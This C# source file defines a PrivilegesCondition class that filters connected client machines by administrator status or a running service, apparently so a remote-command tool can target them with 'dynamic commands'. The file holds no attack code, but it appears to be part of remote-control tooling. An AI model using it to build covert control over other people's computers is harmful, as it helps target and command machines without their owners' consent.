using System;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;

namespace Orcus.Shared.DynamicCommands.Conditions
{
    /// <summary>
    ///     Condition which filters the clients by the privileges they have on their computer
    /// </summary>
    [Serializable]
    public class PrivilegesCondition : Condition
    {
        public override string DisplayString
        {
            get
            {
                if (ServiceRunning && Administrator)
                    return "Service OrElse Administrator";
                if (ServiceRunning)
                    return "Service";
                if (Administrator)
                    return "Administrator";

                return "if (true)";
            }
        }

        public override string ConditionType { get; } = "Privileges";

        public bool ServiceRunning { get; set; }
        public bool Administrator { get; set; }

        public override bool IsTrue(ClientInformation clientInformation, ClientConfig clientConfig)
        {
            if (ServiceRunning && Administrator)
                return clientInformation.IsAdministrator || clientInformation.IsServiceRunning;
            if (ServiceRunning)
                return clientInformation.IsServiceRunning;
            if (Administrator)
                return clientInformation.IsAdministrator;

            return true;
        }
    }
}